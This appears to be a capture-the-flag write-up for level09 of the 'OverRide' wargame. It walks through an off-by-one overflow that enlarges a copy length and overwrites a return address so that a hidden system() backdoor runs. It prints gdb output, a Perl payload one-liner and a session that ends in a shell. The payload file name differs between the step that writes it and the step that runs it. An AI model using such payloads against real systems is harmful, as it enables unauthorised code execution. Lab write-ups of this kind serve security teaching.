Here, we have a binary that asks for a username and then for a message. Looking at the compiled functions, I found one called `secret_backdoor`.

This function is never called, but it contains a call to `system([usr_arg])`, which is exactly what we want to execute a shell later.

Here, the PIE is enabled, but the stack canary isn't, so we only need to find the addresses once and then we can use them to exploit the binary.

First, let's find a vulnerability that let's us segfault the code (aka overwrite the return address of a function).

Using GDB, I found that the `set_username` function copies 1 byte more (41) than the allocated buffer (40), effectively allowing us to write arbitrary data there.

It turns out this is usefull for later because the byte getting overwritten is the amount of bytes copied in the `set_message` function contained in a struct.

This allows us to write more data than the allocated buffer and overwrite the return address of a function with the address of our backdoor.

Now we need to find the offset of the return address from the start of the buffer.

Using a pattern, I found that the offset is 286 bytes from the start of the buffer.

All I need to do now is to prepare my payload and run the exploit.

```bash
(gdb) i func backdoor
All functions matching regular expression "backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor <==== Address of the backdoor function
```

```bash
perl -e 'print "a"x40 . "\xff" . "a"x286 . "\x8c\x48\x55\x55\x55\x55\x00"' > /tmp/payload
```

```bash
level09@OverRide:~$ cat /tmp/1st - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>: Msg @Unix-Dude

>>: >: Msg sent!
/bin/sh
whoami
end
```

And that's it, we have a shell!
